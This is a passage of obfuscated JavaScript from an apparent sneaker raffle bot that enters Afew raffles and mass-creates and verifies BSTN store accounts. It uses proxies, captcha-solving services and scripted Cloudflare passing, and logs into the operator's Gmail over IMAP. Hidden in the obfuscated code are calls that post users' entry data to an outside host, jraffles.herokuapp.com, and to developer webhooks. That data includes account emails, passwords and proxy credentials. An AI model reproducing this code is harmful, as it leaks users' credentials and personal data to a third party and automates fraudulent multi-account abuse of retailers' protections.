                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2fccad[0x0] + ':' + _0x2fccad[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x213ce9 = await _0x5d136d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2fccad[0x0] + ':' + _0x2fccad[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x13c536 = JSON['parse'](_0x65e0bc['readFileSync']('sizes.json', 'utf-8')), _0x351550 = _0x585d00[_0x486823]['Url'], _0x25d5e4 = _0x585d00[_0x486823]['Size'], _0x9f4733;
                        async function _0x4fdab9() {
                            var _0x4922a7 = new _0x2b0e83['CookieJar']();
                            console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0xe72ef6;
                            let _0x24050e = {
                                'method': 'GET',
                                'cookieJar': _0x4922a7,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x2fccad[0x2] + ':' + _0x2fccad[0x3] + '@' + _0x2fccad[0x0] + ':' + _0x2fccad[0x1]
                            }, _0x4109ee = _0x351550['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x59d0fc = _0x4109ee + '.json', _0x1cf70e = await _0x5d1b21(_0x59d0fc);
                            console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0xef7a36 = _0x1cf70e['data']['product']['variants'];
                            if (_0x25d5e4 != 'RANDOM') {
                                if (_0xef7a36[0x1]['option1']['includes']('W')) {
                                    const _0x3c202a = _0x13c536['women']['find'](_0x1807de => _0x1807de['EUsize'] === _0x25d5e4);
                                    _0x3c202a && (_0x25d5e4 = _0x3c202a['size']);
                                } else {
                                    if (_0xef7a36[0x1]['option1']['includes']('Y')) {
                                        const _0x524512 = _0x13c536['GS']['find'](_0x141181 => _0x141181['EUsize'] === _0x25d5e4);
                                        _0x524512 && (_0x25d5e4 = _0x524512['size']);
                                    } else {
                                        const _0x247755 = _0x13c536['men']['find'](_0x4417d7 => _0x4417d7['EUsize'] === _0x25d5e4);
                                        _0x247755 && (_0x25d5e4 = _0x247755['size']);
                                    }
                                }
                                for (var _0x2bb5e0 of _0xef7a36) {
                                    _0x2bb5e0['option1'] == _0x25d5e4 && (_0xe72ef6 = _0x2bb5e0['id']);
                                }
                            } else {
                                var _0x331564 = Math['round'](Math['random']() * (_0xef7a36['length'] - 0x1));
                                _0xe72ef6 = _0xef7a36[_0x331564]['id'];
                            }
                            console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x5d1b21('https://raffles.afew-store.com/cart/' + _0xe72ef6 + ':1'), _0x9f4733 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x4fdab9();
                        } catch (_0x5432ba) {
                            if (_0x5432ba['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x5432ba);
                        }
                        const _0x63ef5c = await _0x213ce9['newPage']();
                        await _0x63ef5c['setDefaultNavigationTimeout'](0x1d4c0), await _0x63ef5c['authenticate']({
                            'username': '' + _0x2fccad[0x2],
                            'password': '' + _0x2fccad[0x3]
                        }), await _0x63ef5c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x63ef5c['setRequestInterception'](!![]), _0x63ef5c['on']('request', _0x26ae1b => {
                            _0x26ae1b['resourceType']() === 'image' || _0x26ae1b['resourceType']() === 'font' || _0x26ae1b['resourceType']() === 'media' ? _0x26ae1b['abort']() : _0x26ae1b['continue']();
                        });
                        try {
                            await _0x63ef5c['goto'](_0x9f4733, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x63ef5c['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x63ef5c['type']('#checkout_email', '' + _0x585d00[_0x486823]['Email']), await _0x116d4a(0x320), await _0x63ef5c['type']('#checkout_attributes_instagram', '' + _0x585d00[_0x486823]['Follower']), await _0x116d4a(0x320), await _0x63ef5c['select']('#checkout_shipping_address_country', '' + _0x585d00[_0x486823]['Country']), await _0x63ef5c['waitForTimeout'](0x258), await _0x63ef5c['type']('#checkout_shipping_address_first_name', '' + _0x585d00[_0x486823]['FirstName']), await _0x63ef5c['waitForTimeout'](0x320), await _0x63ef5c['type']('#checkout_shipping_address_last_name', '' + _0x585d00[_0x486823]['LastName']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_address1', _0x585d00[_0x486823]['Address1'] + '\x20' + _0x585d00[_0x486823]['HouseNumber']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_address2', '' + _0x585d00[_0x486823]['Address2']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_zip', '' + _0x585d00[_0x486823]['Zip']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_city', '' + _0x585d00[_0x486823]['City']), await _0x63ef5c['waitForTimeout'](0x2bc);
                        if (_0x585d00[_0x486823]['State'] != '')
                            try {
                                const _0x3c83a8 = JSON['parse'](_0x65e0bc['readFileSync']('States.json', 'utf8'));
                                await _0x116d4a(0x1f4);
                                if (_0x585d00[_0x486823]['State']['length'] > 0x2)
                                    for (let _0x2a7724 of _0x3c83a8) {
                                        if (_0x2a7724['Province'] == _0x585d00[_0x486823]['State']) {
                                            await _0x63ef5c['select']('#checkout_shipping_address_province', _0x2a7724['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x63ef5c['select']('#checkout_shipping_address_province', _0x585d00[_0x486823]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x116d4a(0x190), _0x63ef5c['evaluate'](() => {
                            const _0x20d46f = document['querySelector']('#continue_button');
                            for (var _0x19538c = 0x0; _0x19538c < 0x5; _0x19538c++) {
                                if (_0x20d46f) {
                                    _0x20d46f['click'](), _0x20d46f['click']();
                                    break;
                                } else
                                    _0x116d4a(0xfa0);
                            }
                        }), await _0x63ef5c['waitForTimeout'](0x9c4);
                        try {
                            await _0x63ef5c['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x63ef5c['$eval']('form[data-shipping-method-form=\x22true\x22]', _0xafd3d0 => _0xafd3d0['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x63ef5c['waitForTimeout'](0x7d0), console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x63ef5c['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x116d4a(0x3e8), await _0x63ef5c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x258ed5 => _0x258ed5['submit']()), await _0x116d4a(0x3e8);
                        try {
                            await _0x63ef5c['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x63ef5c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x4e7bc6 => _0x4e7bc6['submit']());
                        try {
                            await _0x63ef5c['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x1c9b59 = 'no', _0x523ce4(_0x585d00[_0x486823], _0xb02146), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                try {
                                    await _0x3c7bbe(_0x51d52a['webhook'], _0x241d3d['succesDEVMSG']);
                                } catch {
                                }
                            await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x241d3d['succesDEVMSG']), await _0x116d4a(0xc8);
                            try {
                                await _0x3c7bbe(_0x55a106, _0x241d3d['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x358285['replace']('#', ''),
                                    'module': _0xb02146['name'],
                                    'entrydata': JSON['stringify'](_0x46d92e),
                                    'proxy': '' + _0x3263cc[_0x486823]
                                };
                                var _0x59e2ae = JSON['stringify'](prxdata);
                                let _0x843b81 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x59e2ae, _0x843b81);
                            } catch (_0x372979) {
                            }
                        } catch (_0x5912ad) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x417cff) {
                        _0x417cff['message']['includes']('selector') && (_0x417cff = 'Connection\x20Error');
                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20' + _0x417cff)), _0x153d5e = '' + _0x417cff;
                        var _0xe652ee = await _0x2520f4(_0x585d00[_0x486823], _0xb02146, 'dev', !![], _0x153d5e);
                        _0x241d3d['errorDEV'] = { 'embeds': [_0xe652ee] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x241d3d['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x241d3d['errorDEV']), _0x1c9b59 = 'yes';
                    } finally {
                        _0x213ce9 && _0x213ce9['close']();
                        if (_0x1c9b59 == 'yes' && _0x4870ec != 0x5 && _0x153d5e != 'Size\x20Not\x20Found') {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4870ec + '\x20/\x205)')), _0x486823 = _0x486823 - 0x1, _0x4870ec = _0x4870ec + 0x1;
                            continue;
                        }
                        _0x1c9b59 == 'yes' && _0x4870ec >= 0x5 && (_0x5925c7(_0x585d00[_0x486823], _0xb02146), _0x1c9b59 = 'no', _0x4870ec = 0x0);
                        if (_0x486823 + 0x1 == _0x585d00['length']) {
                            await _0x116d4a(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x51d52a['AfewDelay'] + '\x20ms'), await _0x116d4a(_0x51d52a['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x43ffb6, _0x21b0d9, _0x3dce4b) {
                    var _0x3e100d = _0x21b0d9, _0x22f007 = 0x0;
                    for (var _0x4942a6 = 0x0; _0x4942a6 < _0x21b0d9['length']; _0x4942a6++) {
                        maxTasks = Number(_0x51d52a['threads']);
                        while (_0x22f007 >= maxTasks) {
                            await _0x116d4a(_0x51d52a['delay']);
                        }
                        async function _0x10463f(_0x3796bc, _0x565933, _0x3cb800, _0x5d80cf, _0x21c91e) {
                            _0x22f007++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x51d52a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x4eba9a;
                            try {
                                await _0x2c2316(_0x565933, _0x5d80cf);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x244762(_0x3796bc['name'] + '\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20/\x20' + _0x565933['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                            var _0x553bb4 = await _0x2520f4(_0x565933[_0x5d80cf], _0x3796bc, 'acc', ![]);
                            const _0x1b4731 = { 'succesDEVMSG': { 'embeds': [_0x553bb4] } }, _0x55ab1c = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x114434 = Math['round'](Math['random']() * (_0x3cb800['length'] - 0x1)), _0x433f20 = _0x3cb800[_0x114434]['split'](':'), _0x1d6dc9;
                            try {
                                _0x1d6dc9 = await _0x5d136d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x433f20[0x0] + ':' + _0x433f20[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x1d6dc9 = await _0x5d136d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x433f20[0x0] + ':' + _0x433f20[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x3beef8 = await _0x1d6dc9['newPage']();
                                await _0x3beef8['authenticate']({
                                    'username': '' + _0x433f20[0x2],
                                    'password': '' + _0x433f20[0x3]
                                }), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3beef8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3beef8['setRequestInterception'](!![]), _0x3beef8['on']('request', _0x6f0ee1 => {
                                    _0x6f0ee1['resourceType']() === 'image' ? _0x6f0ee1['abort']() : _0x6f0ee1['continue']();
                                });
                                try {
                                    await _0x3beef8['goto']('' + _0x55ab1c), await _0x3beef8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x3beef8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x116d4a(0x7d0), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x116d4a(0x190), await _0x3beef8['waitForSelector']('#firstname'), await _0x3beef8['focus']('#firstname'), await _0x3beef8['keyboard']['down']('Control'), await _0x3beef8['keyboard']['press']('A'), await _0x116d4a(0xc8), await _0x3beef8['keyboard']['up']('Control'), await _0x3beef8['keyboard']['press']('Backspace'), await _0x3beef8['type']('#firstname', _0x565933[_0x5d80cf]['FirstName'], { 'delay': 0xf0 }), await _0x116d4a(0x190), await _0x3beef8['focus']('#lastname'), await _0x3beef8['keyboard']['down']('Control'), await _0x3beef8['keyboard']['press']('A'), await _0x116d4a(0xc8), await _0x3beef8['keyboard']['up']('Control'), await _0x3beef8['keyboard']['press']('Backspace'), await _0x3beef8['type']('#lastname', _0x565933[_0x5d80cf]['LastName'], { 'delay': 0xe6 }), await _0x116d4a(0x190), await _0x3beef8['focus']('#email_address'), await _0x3beef8['keyboard']['down']('Control'), await _0x3beef8['keyboard']['press']('A'), await _0x116d4a(0xc8), await _0x3beef8['keyboard']['up']('Control'), await _0x3beef8['keyboard']['press']('Backspace'), await _0x3beef8['type']('#email_address', _0x565933[_0x5d80cf]['Email'], { 'delay': 0x122 }), await _0x116d4a(0x190), await _0x3beef8['type']('#password', _0x565933[_0x5d80cf]['Password'], { 'delay': 0x82 }), await _0x116d4a(0x1f4), await _0x3beef8['type']('#password-confirmation', _0x565933[_0x5d80cf]['Password'], { 'delay': 0x7c }), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Sending\x20Request'), await _0x116d4a(0x2bc), await _0x3beef8['$eval']('#form-validate', _0x1eb530 => _0x1eb530['submit']()), await _0x116d4a(0x1388);
                                const _0x487712 = await _0x3beef8['$']('#email_address-error');
                                if (_0x487712)
                                    throw new Error('Invalid\x20Email');
                                const _0x5476dc = await _0x3beef8['$']('#password-error');
                                if (_0x5476dc)
                                    throw new Error('Invalid\x20Password');
                                await _0x3beef8['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Account\x20' + _0x565933[_0x5d80cf]['Email'] + '\x20Generated')), _0x65e0bc['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x565933[_0x5d80cf]['Email'] + ',' + _0x565933[_0x5d80cf]['Password']);
                                try {
                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1b4731['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c7bbe(_0x431ce7, _0x1b4731['succesDEVMSG']);
                                let _0xd3ce80 = _0x565933[_0x5d80cf];
                                try {
                                    prxdata = {
                                        'username': _0x358285['replace']('#', ''),
                                        'module': _0x3796bc['name'],
                                        'entrydata': JSON['stringify'](_0xd3ce80),
                                        'proxy': '' + _0x3cb800[_0x5d80cf]
                                    };
                                    var _0x4a4598 = JSON['stringify'](prxdata);
                                    let _0x2feaa2 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x4a4598, _0x2feaa2);
                                } catch (_0x1f8c36) {
                                }
                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x46c021) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20' + _0x46c021)), _0x4eba9a = '' + _0x46c021;
                                var _0xc9eb70 = await _0x2520f4(_0x565933[_0x5d80cf], _0x3796bc, 'acc', !![], _0x4eba9a);
                                _0x1b4731['errorDEV'] = { 'embeds': [_0xc9eb70] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1b4731['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1b4731['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x1d6dc9)
                                    _0x1d6dc9['close']();
                                if (retry == 'yes' && _0x21c91e != 0x5)
                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Retrying\x20(' + (_0x21c91e + 0x1) + '\x20/\x205)')), _0x22f007--, _0x21c91e = _0x21c91e + 0x1, _0x10463f(_0x3796bc, _0x565933, _0x3cb800, _0x5d80cf, _0x21c91e);
                                retry == 'yes' && _0x21c91e >= 0x5 && (_0x5925c7(_0x565933[_0x5d80cf], _0x3796bc), retry = 'no', _0x21c91e = 0x0), _0x22f007--, console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                            }
                        }
                        _0x10463f(_0x43ffb6, _0x3e100d, _0x3dce4b, _0x4942a6, 0x0), await _0x116d4a(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x38a2c5, _0x197def) {
                    var _0x49fdce = ![], _0x410a0c = [], _0x474192 = 0x0;
                    async function _0x358e77() {
                        var _0x5309c0 = new _0x3e4e8d({
                            'user': _0x51d52a['masterMail'],
                            'password': _0x51d52a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1b9af6(_0x351483) {
                            _0x5309c0['openBox']('INBOX', ![], _0x351483);
                        }
                        _0x5309c0['once']('ready', function () {
                            _0x1b9af6(function (_0x59ef7f, _0x464dd8) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x59ef7f)
                                    throw _0x59ef7f;
                                _0x5309c0['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x3b9add, _0x506be2) {
                                    if (!_0x506be2 || !_0x506be2['length'])
                                        console['log'](_0x3982db() + '\x20[' + _0x38a2c5['name'] + ']\x20No\x20mails\x20found'), _0x5309c0['end']();
                                    else {
                                        var _0x511f82 = _0x5309c0['seq']['fetch'](_0x506be2, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x511f82['on']('message', function (_0x440dfe, _0x5a418e) {
                                            var _0x1ff81d = '(#' + _0x5a418e + ')\x20';
                                            _0x440dfe['on']('body', function (_0x162d3a, _0x3007ba) {
                                                _0x300bc8(_0x162d3a, (_0xa81c36, _0x1a7846) => {
                                                    var _0x483dbb = _0x1a7846['text']['split']('customer/account/confirm/')[0x1], _0x5839df = _0x483dbb['split'](']')[0x0];
                                                    _0x410a0c['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x5839df);
                                                });
                                            }), _0x440dfe['once']('end', function () {
                                            });
                                        }), _0x511f82['once']('error', function (_0x1aef14) {
                                            console['log']('Fetch\x20error:\x20' + _0x1aef14), _0x49fdce = !![];
                                        }), _0x511f82['once']('end', function () {
                                            _0x5309c0['end'](), _0x49fdce = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x5309c0['once']('error', function (_0xb53e7a) {
                            console['log'](_0x1403a4['red'](_0xb53e7a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x49fdce = !![];
                        }), _0x5309c0['once']('end', async function () {
                            _0x49fdce = !![];
                        }), _0x5309c0['connect']();
                    }
                    try {
                        _0x358e77();
                        while (!_0x49fdce) {
                            await _0x116d4a(0xfa0);
                        }
                        console['log']('Found\x20' + _0x410a0c['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x116d4a(0x7d0);
                    }
                    for (var _0x5cc262 = 0x0; _0x5cc262 < _0x410a0c['length']; _0x5cc262++) {
                        maxTasks = Number(_0x51d52a['threads']);
                        while (_0x474192 >= maxTasks) {
                            await _0x116d4a(_0x51d52a['delay']);
                        }
                        async function _0x5c97b8(_0x1bde57, _0x2d1436, _0x38fa83, _0x2fe0f8, _0x3d9e7c) {
                            _0x474192++, _0x5d136d['use'](_0x2ce6bf());
                            if (_0x2a1076 != 'yes')
                                var _0x2a1076 = '', _0x3d9e7c = 0x0;
                            var _0x192e2b = Math['round'](Math['random']() * (_0x38fa83['length'] - 0x1)), _0x116f57 = _0x38fa83[_0x192e2b]['split'](':'), _0x21b434;
                            try {
                                _0x21b434 = await _0x5d136d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x116f57[0x0] + ':' + _0x116f57[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x21b434 = await _0x5d136d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x116f57[0x0] + ':' + _0x116f57[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x30adc1 = await _0x21b434['newPage']();
                                await _0x30adc1['authenticate']({
                                    'username': '' + _0x116f57[0x2],
                                    'password': '' + _0x116f57[0x3]
                                }), console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x30adc1['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x30adc1['setRequestInterception'](!![]), _0x30adc1['on']('request', _0xd0f76f => {
                                    _0xd0f76f['resourceType']() === 'image' || _0xd0f76f['resourceType']() === 'font' || _0xd0f76f['resourceType']() === 'media' ? _0xd0f76f['abort']() : _0xd0f76f['continue']();
                                }), console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x30adc1['goto'](_0x2d1436[_0x2fe0f8]);
                                } catch (_0x57c5c4) {
                                    _0x2a1076 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x57c5c4);
                                }
                                console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x30adc1['waitForTimeout'](0xbb8);
                                try {
                                    await _0x30adc1['waitForSelector']('.account-nav'), _0x2a1076 = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x154d7d = await _0x2520f4(null, _0x1bde57, 'ver', ![]);
                                    const _0x596cfb = { 'succesDEVMSG': { 'embeds': [_0x154d7d] } };
                                    await _0x3c7bbe(_0x7cc4fb, _0x596cfb['succesDEVMSG']);
                                } catch {
                                    _0x2a1076 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x1bc858) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20' + _0x1bc858));
                                var _0x5b4085 = _0x1bc858, _0x2bb749 = await _0x2520f4(null, _0x1bde57, 'ver', !![], _0x5b4085);
                                const _0x3e085d = { 'errorDEVMSG': { 'embeds': [_0x2bb749] } };
                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x3e085d['errorDEVMSG']), await _0x3c7bbe(_0x802c1e, _0x3e085d['errorDEVMSG']);
                            } finally {
                                _0x21b434['close']();
                                if (_0x2a1076 == 'yes' && _0x3d9e7c != 0x5)
                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3d9e7c + '\x20/\x205)')), _0x474192--, _0x3d9e7c = _0x3d9e7c + 0x1, _0x5c97b8(_0x1bde57, _0x2d1436, _0x38fa83, _0x2fe0f8, _0x3d9e7c);
